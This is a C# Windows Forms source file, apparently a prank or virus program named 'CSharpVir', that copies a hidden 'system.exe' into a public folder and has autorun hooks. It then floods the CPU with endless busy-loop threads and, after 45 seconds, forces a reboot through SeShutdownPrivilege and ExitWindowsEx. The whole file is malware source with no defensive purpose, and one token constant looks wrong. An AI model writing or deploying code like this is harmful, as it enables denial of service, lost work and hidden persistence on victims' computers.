using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using JCS;

namespace CSharpVir
{
    public partial class Form1 : Form
    {
        private static string needPath = "C:\\Users\\Public\\";
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);
        internal const int EWX_REBOOT = 0x00000002;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000002;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000002;

        private static Thread thread1;
        private static void DoExitWin(int flg)
        {
            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }
        
        private static void start()
        {
            Stopwatch sw=new Stopwatch();
            sw.Start();
            bool b = true;
            bool pl = false;
            while (b)
            {
                if (sw.ElapsedMilliseconds > 20000)
                {
                    if (!pl)
                    {
                        Thread g=new Thread(sys_sleep);
                        g.Start();
                        pl = true;
                    }
                }
                if (sw.ElapsedMilliseconds > 45000)
                {
                    DoExitWin(EWX_REBOOT);
                    b = false;
                }
            }
        }

        public Form1()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista")
            {
                //Autorun.SetAutorunValue(true, needPath + "system.exe");
                Autorun.SetAutorunValue(false, needPath + "system.exe");
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
                {
                    needPath = "C:\\Documents and Settings\\All Users\\";
                    //Autorun.SetAutorunValue(true, needPath + "system.exe");
                    Autorun.SetAutorunValue(false, needPath + "system.exe");
                }

            InitializeComponent();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(needPath + "system.exe"))
            {
                try
                {
                    File.Copy("system.exe", needPath+"system.exe");
                    File.SetAttributes(needPath+"system.exe",FileAttributes.Hidden);
                }
                catch {}
            }
            start();
        }
        private static void sys_sleep()
        {
            while (true)
            {
                Thread s = new Thread(s_b);
                s.Start();
            }
        }
        private static void s_b()
        {
            int y = 2;
            while (true)
            {
                y *= y;
            }
        }
    }
}
